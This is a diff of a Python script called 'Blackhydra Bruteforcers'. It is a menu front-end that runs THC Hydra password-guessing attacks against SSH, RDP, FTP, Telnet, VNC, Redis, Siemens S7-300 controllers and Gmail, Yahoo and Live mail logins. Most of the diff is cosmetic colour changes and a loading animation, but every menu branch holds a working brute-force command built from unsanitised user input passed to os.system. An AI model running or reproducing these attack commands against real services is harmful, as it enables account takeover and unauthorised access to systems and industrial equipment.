@@ -1,4 +1,5 @@
 #!/usr/bin/python
+# -*- coding: utf-8 -*-
 # Blackhydra Bruteforcers
 # Coded by Senja
 # Github: github.com/thedarksec/Blackhydra
@@ -18,9 +19,16 @@ def restart_program():
    os.execl(python, python, * sys.argv)
    curdir = os.getcwd()
 
+def loads():
+    tix = [
+     '.   ', '..  ', '... ']
+    for o in tix:
+        print '\r\x1b[0m[\x1b[94;1m\xe2\x97\x8f\x1b[0m] \x1b[0mLoading ' + o,
+        sys.stdout.flush()
+        time.sleep(1)
 
-def write(z):
-    for e in z + '\n':
+def write(f):
+    for e in f + '\n':
         sys.stdout.write(e)
         sys.stdout.flush()
         time.sleep(0.03)
@@ -41,7 +49,7 @@ print (logo)
 
 print ("\033[0m[\033[1;94m#\033[0m] \033[77mTHC Hydra BruteForcers")
 print ("\033[0m[\033[1;93m*\033[0m] \033[77mCoded by Senja")
-print ("\033[0m[\033[1;96m*\033[0m] \033[77mMy Github: @thedarksec")
+print ("\033[0m[\033[1;96m&\033[0m] \033[77mMy Github: @thedarksec")
 time.sleep(1)
 print
 print ("\033[0m[\033[1;92m01\033[0m] \033[1;77mCisco    \033[0m[\033[1;92m07\033[0m] \033[1;77mTelnet    \033[0m[\033[1;92m13\033[0m] \033[1;77mImap     \033[0m[\033[1;92m19\033[0m] \033[1;77mRedis  ")
@@ -58,7 +66,9 @@ if option == '01' or option == '1':
         write ("\033[0m[\033[91;1m!\033[0m] \033[77;1mChecking ...")
         print
         word = raw_input("\x1b[0m[\x1b[1;96m+\x1b[0m] \033[1;77mWordlist: \033[0m")
-        iphost = raw_input("\x1b[0m[\x1b[1;94m+\x1b[0m] \033[1;77mIP/Hostname: \033[0m")
+        iphost = raw_input("\x1b[0m[\x1b[1;93m+\x1b[0m] \033[1;77mIP/Hostname: \033[0m")
+        loads()
+        print
         print
         os.system("hydra -P %s %s cisco" % (word, iphost))
         print
@@ -69,7 +79,9 @@ elif option == '02' or option == '2':
         write ("\033[0m[\033[91;1m!\033[0m] \033[77;1mChecking ...")
         print
         word = raw_input("\x1b[0m[\x1b[1;96m+\x1b[0m] \033[1;77mWordlist: \033[0m")
-        iphost = raw_input("\x1b[0m[\x1b[1;94m+\x1b[0m] \033[1;77mIP/Hostname: \033[0m")
+        iphost = raw_input("\x1b[0m[\x1b[1;93m+\x1b[0m] \033[1;77mIP/Hostname: \033[0m")
+        loads()
+        print
         print
         os.system("hydra -P %s -e n -t 1 %s vnc -V" % (word, iphost))
         print
@@ -79,9 +91,11 @@ elif option == '03' or option == '3':
         print
         write ("\033[0m[\033[91;1m!\033[0m] \033[77;1mChecking ...")
         print
-        user = raw_input("\x1b[0m[\x1b[1;92m+\x1b[0m] \033[1;77mUser: \033[0m")
+        user = raw_input("\x1b[0m[\x1b[1;96m+\x1b[0m] \033[1;77mUser: \033[0m")
         word = raw_input("\x1b[0m[\x1b[1;93m+\x1b[0m] \033[1;77mWordlist: \033[0m")
-        iphost = raw_input("\x1b[0m[\x1b[1;94m+\x1b[0m] \033[1;77mIP/Hostname: \033[0m")
+        iphost = raw_input("\x1b[0m[\x1b[1;95m+\x1b[0m] \033[1;77mIP/Hostname: \033[0m")
+        loads()
+        print
         print
         os.system("hydra -l %s -P %s %s ftp" % (user, word, iphost))
         print
@@ -91,8 +105,10 @@ elif option == '04' or option == '4':
         print
         write ("\033[0m[\033[91;1m!\033[0m] \033[77;1mChecking ...")
         print
-        email = raw_input("\x1b[0m[\x1b[1;94m+\x1b[0m] \033[1;77mEmail: \033[0m")
-        word = raw_input("\x1b[0m[\x1b[1;96m+\x1b[0m] \033[1;77mWordlist: \033[0m")
+        email = raw_input("\x1b[0m[\x1b[1;96m+\x1b[0m] \033[1;77mEmail: \033[0m")
+        word = raw_input("\x1b[0m[\x1b[1;93m+\x1b[0m] \033[1;77mWordlist: \033[0m")
+        loads()
+        print
         print
         os.system("hydra -l %s -P %s -s 465 smtp.gmail.com smtp" % (email, word))
         print
@@ -102,9 +118,11 @@ elif option == '05' or option == '5':
         print
         write ("\033[0m[\033[91;1m!\033[0m] \033[77;1mChecking ...")
         print
-        user = raw_input("\x1b[0m[\x1b[1;92m+\x1b[0m] \033[1;77mUser: \033[0m")
+        user = raw_input("\x1b[0m[\x1b[1;96m+\x1b[0m] \033[1;77mUser: \033[0m")
         word = raw_input("\x1b[0m[\x1b[1;93m+\x1b[0m] \033[1;77mWordlist: \033[0m")
-        iphost = raw_input("\x1b[0m[\x1b[1;94m+\x1b[0m] \033[1;77mIP/Hostname: \033[0m")
+        iphost = raw_input("\x1b[0m[\x1b[1;95m+\x1b[0m] \033[1;77mIP/Hostname: \033[0m")
+        loads()
+        print
         print
         os.system("hydra -l %s -P %s %s ssh" % (user, word, iphost))
         print
@@ -114,9 +132,11 @@ elif option == '06' or option == '6':
         print
         write ("\033[0m[\033[91;1m!\033[0m] \033[77;1mChecking ...")
         print
-        user = raw_input("\x1b[0m[\x1b[1;92m+\x1b[0m] \033[1;77mUser: \033[0m")
+        user = raw_input("\x1b[0m[\x1b[1;96m+\x1b[0m] \033[1;77mUser: \033[0m")
         word = raw_input("\x1b[0m[\x1b[1;93m+\x1b[0m] \033[1;77mWordlist: \033[0m")
-        iphost = raw_input("\x1b[0m[\x1b[1;94m+\x1b[0m] \033[1;77mIP/Hostname: \033[0m")
+        iphost = raw_input("\x1b[0m[\x1b[1;95m+\x1b[0m] \033[1;77mIP/Hostname: \033[0m")
+        loads()
+        print
         print
         os.system("hydra -l %s -P %s -s 8676 %s teamspeak" % (user, word, iphost))
         print
@@ -126,9 +146,11 @@ elif option == '07' or option == '7':
         print
         write ("\033[0m[\033[91;1m!\033[0m] \033[77;1mChecking ...")
         print
-        user = raw_input("\x1b[0m[\x1b[1;92m+\x1b[0m] \033[1;77mUser: \033[0m")
+        user = raw_input("\x1b[0m[\x1b[1;96m+\x1b[0m] \033[1;77mUser: \033[0m")
         word = raw_input("\x1b[0m[\x1b[1;93m+\x1b[0m] \033[1;77mWordlist: \033[0m")
-        iphost = raw_input("\x1b[0m[\x1b[1;94m+\x1b[0m] \033[1;77mIP/Hostname: \033[0m")
+        iphost = raw_input("\x1b[0m[\x1b[1;95m+\x1b[0m] \033[1;77mIP/Hostname: \033[0m")
+        loads()
+        print
         print
         os.system("hydra -l %s -P %s %s telnet" % (user, word, iphost))
         print
@@ -138,8 +160,10 @@ elif option == '08' or option == '8':
         print
         write ("\033[0m[\033[91;1m!\033[0m] \033[77;1mChecking ...")
         print
-        email = raw_input("\x1b[0m[\x1b[1;94m+\x1b[0m] \033[1;77mEmail: \033[0m")
-        word = raw_input("\x1b[0m[\x1b[1;96m+\x1b[0m] \033[1;77mWordlist: \033[0m")
+        email = raw_input("\x1b[0m[\x1b[1;96m+\x1b[0m] \033[1;77mEmail: \033[0m")
+        word = raw_input("\x1b[0m[\x1b[1;93m+\x1b[0m] \033[1;77mWordlist: \033[0m")
+        loads()
+        print
         print
         os.system("hydra -l %s -P %s -s 587 smtp.mail.yahoo.com smtp" % (email, word))
         print
@@ -149,8 +173,10 @@ elif option == '09' or option == '9':
         print
         write ("\033[0m[\033[91;1m!\033[0m] \033[77;1mChecking ...")
         print
-        email = raw_input("\x1b[0m[\x1b[1;94m+\x1b[0m] \033[1;77mEmail: \033[0m")
-        word = raw_input("\x1b[0m[\x1b[1;96m+\x1b[0m] \033[1;77mWordlist: \033[0m")
+        email = raw_input("\x1b[0m[\x1b[1;96m+\x1b[0m] \033[1;77mEmail: \033[0m")
+        word = raw_input("\x1b[0m[\x1b[1;93m+\x1b[0m] \033[1;77mWordlist: \033[0m")
+        loads()
+        print
         print
         os.system("hydra -l %s -P %s -s 587 smtp.live.com smtp" % (email, word))
         print
@@ -160,9 +186,11 @@ elif option == '10':
         print
         write ("\033[0m[\033[91;1m!\033[0m] \033[77;1mChecking ...")
         print
-        user = raw_input("\x1b[0m[\x1b[1;92m+\x1b[0m] \033[1;77mUser: \033[0m")
+        user = raw_input("\x1b[0m[\x1b[1;96m+\x1b[0m] \033[1;77mUser: \033[0m")
         word = raw_input("\x1b[0m[\x1b[1;93m+\x1b[0m] \033[1;77mWordlist: \033[0m")
-        iphost = raw_input("\x1b[0m[\x1b[1;94m+\x1b[0m] \033[1;77mIP/Hostname: \033[0m")
+        iphost = raw_input("\x1b[0m[\x1b[1;95m+\x1b[0m] \033[1;77mIP/Hostname: \033[0m")
+        loads()
+        print
         print
         os.system("hydra -m / -l %s -P %s %s http-get" % (user, word, iphost))
         print
@@ -172,9 +200,11 @@ elif option == '11':
         print
         write ("\033[0m[\033[91;1m!\033[0m] \033[77;1mChecking ...")
         print
-        user = raw_input("\x1b[0m[\x1b[1;92m+\x1b[0m] \033[1;77mUser: \033[0m")
+        user = raw_input("\x1b[0m[\x1b[1;96m+\x1b[0m] \033[1;77mUser: \033[0m")
         word = raw_input("\x1b[0m[\x1b[1;93m+\x1b[0m] \033[1;77mWordlist: \033[0m")
-        iphost = raw_input("\x1b[0m[\x1b[1;94m+\x1b[0m] \033[1;77mIP/Hostname: \033[0m")
+        iphost = raw_input("\x1b[0m[\x1b[1;95m+\x1b[0m] \033[1;77mIP/Hostname: \033[0m")
+        loads()
+        print
         print
         os.system("hydra -t 1 -V -f -l %s -P %s %s rdp" % (user, word, iphost))
         print
@@ -186,6 +216,8 @@ elif option == '12':
         print
         user = raw_input("\x1b[0m[\x1b[1;96m+\x1b[0m] \033[1;77mUser: \033[0m")
         word = raw_input("\x1b[0m[\x1b[1;93m+\x1b[0m] \033[1;77mWordlist: \033[0m")
+        loads()
+        print
         print
         os.system("hydra -t 5 -V -f -l %s -e ns -P %s localhost mysql" % (user, word))
         print
@@ -195,9 +227,11 @@ elif option == '13':
         print
         write ("\033[0m[\033[91;1m!\033[0m] \033[77;1mChecking ...")
         print
-        user = raw_input("\x1b[0m[\x1b[1;92m+\x1b[0m] \033[1;77mUser: \033[0m")
+        user = raw_input("\x1b[0m[\x1b[1;96m+\x1b[0m] \033[1;77mUser: \033[0m")
         word = raw_input("\x1b[0m[\x1b[1;93m+\x1b[0m] \033[1;77mWordlist: \033[0m")
-        iphost = raw_input("\x1b[0m[\x1b[1;94m+\x1b[0m] \033[1;77mIP/Hostname: \033[0m")
+        iphost = raw_input("\x1b[0m[\x1b[1;95m+\x1b[0m] \033[1;77mIP/Hostname: \033[0m")
+        loads()
+        print
         print
         os.system("hydra -l %s -p %s %s imap" % (user, word, iphost))
         print
@@ -207,9 +241,11 @@ elif option == '14':
         print
         write ("\033[0m[\033[91;1m!\033[0m] \033[77;1mChecking ...")
         print
-        user = raw_input("\x1b[0m[\x1b[1;92m+\x1b[0m] \033[1;77mUser: \033[0m")
+        user = raw_input("\x1b[0m[\x1b[1;96m+\x1b[0m] \033[1;77mUser: \033[0m")
         word = raw_input("\x1b[0m[\x1b[1;93m+\x1b[0m] \033[1;77mWordlist: \033[0m")
-        iphost = raw_input("\x1b[0m[\x1b[1;94m+\x1b[0m] \033[1;77mIP/Hostname: \033[0m")
+        iphost = raw_input("\x1b[0m[\x1b[1;95m+\x1b[0m] \033[1;77mIP/Hostname: \033[0m")
+        loads()
+        print
         print
         os.system("hydra -l %s -P %s -s 8676 %s sshkey" % (user, word, iphost))
         print
@@ -219,9 +255,11 @@ elif option == '15':
         print
         write ("\033[0m[\033[91;1m!\033[0m] \033[77;1mChecking ...")
         print
-        user = raw_input("\x1b[0m[\x1b[1;92m+\x1b[0m] \033[1;77mUser: \033[0m")
+        user = raw_input("\x1b[0m[\x1b[1;96m+\x1b[0m] \033[1;77mUser: \033[0m")
         word = raw_input("\x1b[0m[\x1b[1;93m+\x1b[0m] \033[1;77mWordlist: \033[0m")
-        iphost = raw_input("\x1b[0m[\x1b[1;94m+\x1b[0m] \033[1;77mIP/Hostname: \033[0m")
+        iphost = raw_input("\x1b[0m[\x1b[1;95m+\x1b[0m] \033[1;77mIP/Hostname: \033[0m")
+        loads()
+        print
         print
         os.system("hydra -l %s -P %s %s pop3" % (user, word, iphost))
         print
@@ -231,9 +269,11 @@ elif option == '16':
         print
         write ("\033[0m[\033[91;1m!\033[0m] \033[77;1mChecking ...")
         print
-        user = raw_input("\x1b[0m[\x1b[1;92m+\x1b[0m] \033[1;77mUser: \033[0m")
+        user = raw_input("\x1b[0m[\x1b[1;96m+\x1b[0m] \033[1;77mUser: \033[0m")
         word = raw_input("\x1b[0m[\x1b[1;93m+\x1b[0m] \033[1;77mWordlist: \033[0m")
-        iphost = raw_input("\x1b[0m[\x1b[1;94m+\x1b[0m] \033[1;77mIP/Hostname: \033[0m")
+        iphost = raw_input("\x1b[0m[\x1b[1;95m+\x1b[0m] \033[1;77mIP/Hostname: \033[0m")
+        loads()
+        print
         print
         os.system("hydra -l %s -P %s %s rexec" % (user, word, iphost))
         print
@@ -243,9 +283,11 @@ elif option == '17':
         print
         write ("\033[0m[\033[91;1m!\033[0m] \033[77;1mChecking ...")
         print
-        user = raw_input("\x1b[0m[\x1b[1;92m+\x1b[0m] \033[1;77mUser: \033[0m")
+        user = raw_input("\x1b[0m[\x1b[1;96m+\x1b[0m] \033[1;77mUser: \033[0m")
         word = raw_input("\x1b[0m[\x1b[1;93m+\x1b[0m] \033[1;77mWordlist: \033[0m")
-        iphost = raw_input("\x1b[0m[\x1b[1;94m+\x1b[0m] \033[1;77mIP/Hostname: \033[0m")
+        iphost = raw_input("\x1b[0m[\x1b[1;95m+\x1b[0m] \033[1;77mIP/Hostname: \033[0m")
+        loads()
+        print
         print
         os.system("hydra -l %s -P %s %s xmpp" % (user, word, iphost))
         print
@@ -256,7 +298,9 @@ elif option == '18':
         write ("\033[0m[\033[91;1m!\033[0m] \033[77;1mChecking ...")
         print
         word = raw_input("\x1b[0m[\x1b[1;96m+\x1b[0m] \033[1;77mWordlist: \033[0m")
-        iphost = raw_input("\x1b[0m[\x1b[1;94m+\x1b[0m] \033[1;77mIP/Hostname: \033[0m")
+        iphost = raw_input("\x1b[0m[\x1b[1;93m+\x1b[0m] \033[1;77mIP/Hostname: \033[0m")
+        loads()
+        print
         print
         os.system("hydra -P %s %s adam6500" % (word, iphost))
         print
@@ -267,7 +311,9 @@ elif option == '19':
         write ("\033[0m[\033[91;1m!\033[0m] \033[77;1mChecking ...")
         print
         word = raw_input("\x1b[0m[\x1b[1;96m+\x1b[0m] \033[1;77mWordlist: \033[0m")
-        iphost = raw_input("\x1b[0m[\x1b[1;94m+\x1b[0m] \033[1;77mIP/Hostname: \033[0m")
+        iphost = raw_input("\x1b[0m[\x1b[1;93m+\x1b[0m] \033[1;77mIP/Hostname: \033[0m")
+        loads()
+        print
         print
         os.system("hydra -P %s %s redis" % (word, iphost))
         print
@@ -277,9 +323,11 @@ elif option == '20':
         print
         write ("\033[0m[\033[91;1m!\033[0m] \033[77;1mChecking ...")
         print
-        user = raw_input("\x1b[0m[\x1b[1;92m+\x1b[0m] \033[1;77mUser: \033[0m")
+        user = raw_input("\x1b[0m[\x1b[1;96m+\x1b[0m] \033[1;77mUser: \033[0m")
         word = raw_input("\x1b[0m[\x1b[1;93m+\x1b[0m] \033[1;77mWordlist: \033[0m")
-        iphost = raw_input("\x1b[0m[\x1b[1;94m+\x1b[0m] \033[1;77mIP/Hostname: \033[0m")
+        iphost = raw_input("\x1b[0m[\x1b[1;95m+\x1b[0m] \033[1;77mIP/Hostname: \033[0m")
+        loads()
+        print
         print
         os.system("hydra -l %s -P %s %s pcanywhere" % (user, word, iphost))
         print
@@ -289,9 +337,11 @@ elif option == '21':
         print
         write ("\033[0m[\033[91;1m!\033[0m] \033[77;1mChecking ...")
         print
-        user = raw_input("\x1b[0m[\x1b[1;92m+\x1b[0m] \033[1;77mUser: \033[0m")
+        user = raw_input("\x1b[0m[\x1b[1;96m+\x1b[0m] \033[1;77mUser: \033[0m")
         word = raw_input("\x1b[0m[\x1b[1;93m+\x1b[0m] \033[1;77mWordlist: \033[0m")
-        iphost = raw_input("\x1b[0m[\x1b[1;94m+\x1b[0m] \033[1;77mIP/Hostname: \033[0m")
+        iphost = raw_input("\x1b[0m[\x1b[1;95m+\x1b[0m] \033[1;77mIP/Hostname: \033[0m")
+        loads()
+        print
         print
         os.system("hydra -l %s -P %s %s nntp" % (user, word, iphost))
         print
@@ -302,7 +352,9 @@ elif option == '22':
         write ("\033[0m[\033[91;1m!\033[0m] \033[77;1mChecking ...")
         print
         word = raw_input("\x1b[0m[\x1b[1;96m+\x1b[0m] \033[1;77mWordlist: \033[0m")
-        iphost = raw_input("\x1b[0m[\x1b[1;94m+\x1b[0m] \033[1;77mIP/Hostname: \033[0m")
+        iphost = raw_input("\x1b[0m[\x1b[1;93m+\x1b[0m] \033[1;77mIP/Hostname: \033[0m")
+        loads()
+        print
         print
         os.system("hydra -P %s %s s7-300" % (word, iphost))
         print
@@ -312,9 +364,11 @@ elif option == '23':
         print
         write ("\033[0m[\033[91;1m!\033[0m] \033[77;1mChecking ...")
         print
-        user = raw_input("\x1b[0m[\x1b[1;92m+\x1b[0m] \033[1;77mUser: \033[0m")
+        user = raw_input("\x1b[0m[\x1b[1;96m+\x1b[0m] \033[1;77mUser: \033[0m")
         word = raw_input("\x1b[0m[\x1b[1;93m+\x1b[0m] \033[1;77mWordlist: \033[0m")
-        iphost = raw_input("\x1b[0m[\x1b[1;94m+\x1b[0m] \033[1;77mIP/Hostname: \033[0m")
+        iphost = raw_input("\x1b[0m[\x1b[1;95m+\x1b[0m] \033[1;77mIP/Hostname: \033[0m")
+        loads()
+        print
         print
         os.system("hydra -l %s -P %s %s socks5" % (user, word, iphost))
         print
